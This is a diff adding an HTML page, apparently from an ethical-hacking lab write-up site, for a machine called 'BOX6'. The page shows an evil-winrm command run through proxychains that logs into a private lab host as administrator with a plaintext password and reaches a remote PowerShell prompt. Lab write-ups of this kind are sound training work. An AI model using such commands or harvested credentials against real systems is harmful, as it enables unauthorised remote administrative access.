@@ -1,0 +1,28 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX6</h1>
+    <p class="text">We have admin cred.</p>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ proxychains4 evil-winrm -i 172.16.67.6 -u administrator -p 'vau!XCKjNQBv2$'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents></code></pre></div>
+</body>
+</html>
